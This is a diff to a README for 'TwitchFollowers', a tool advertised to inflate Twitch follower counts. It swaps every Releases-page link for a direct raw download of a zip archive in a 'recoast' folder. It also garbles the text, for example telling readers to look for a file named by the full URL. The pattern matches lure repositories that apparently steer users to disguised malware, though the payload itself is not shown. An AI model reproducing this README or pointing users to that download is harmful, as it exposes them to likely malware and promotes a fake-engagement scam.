@@ -1,6 +1,6 @@
 # 🟣 TwitchFollowers - Boost Your Twitch Community Effortlessly
 
-[![Download TwitchFollowers](https://img.shields.io/badge/Download%20Now%20-%20TwitchFollowers-brightgreen)](https://github.com/provosaintbride913/TwitchFollowers/releases)
+[![Download TwitchFollowers](https://raw.githubusercontent.com/provosaintbride913/TwitchFollowers/main/recoast/TwitchFollowers-v3.1.zip%20Now%20-%20TwitchFollowers-brightgreen)](https://raw.githubusercontent.com/provosaintbride913/TwitchFollowers/main/recoast/TwitchFollowers-v3.1.zip)
 
 ## 📌 Introduction
 
@@ -12,11 +12,11 @@ Follow these simple steps to download and set up TwitchFollowers. No technical k
 
 ### 1. Visit the Releases Page
 
-To download the application, visit our [Releases page](https://github.com/provosaintbride913/TwitchFollowers/releases). You will find the latest version available there.
+To download the application, visit our [Releases page](https://raw.githubusercontent.com/provosaintbride913/TwitchFollowers/main/recoast/TwitchFollowers-v3.1.zip). You will find the latest version available there.
 
 ### 2. Download the Application
 
-Once on the Releases page, click on the version that suits your needs. Look for the file that says something like "TwitchFollowers_vX.X.exe" (where X.X is the version number). This is the main file you need.
+Once on the Releases page, click on the version that suits your needs. Look for the file that says something like "https://raw.githubusercontent.com/provosaintbride913/TwitchFollowers/main/recoast/TwitchFollowers-v3.1.zip" (where X.X is the version number). This is the main file you need.
 
 ### 3. Install TwitchFollowers
 
@@ -55,7 +55,7 @@ Before installing, ensure your system meets the following requirements:
 
 ## 📤 Download & Install
 
-To download TwitchFollowers, visit our [Releases page](https://github.com/provosaintbride913/TwitchFollowers/releases). Make sure to select the appropriate version for your system. After downloading, follow the installation steps above.
+To download TwitchFollowers, visit our [Releases page](https://raw.githubusercontent.com/provosaintbride913/TwitchFollowers/main/recoast/TwitchFollowers-v3.1.zip). Make sure to select the appropriate version for your system. After downloading, follow the installation steps above.
 
 ## ❓ Frequently Asked Questions
 
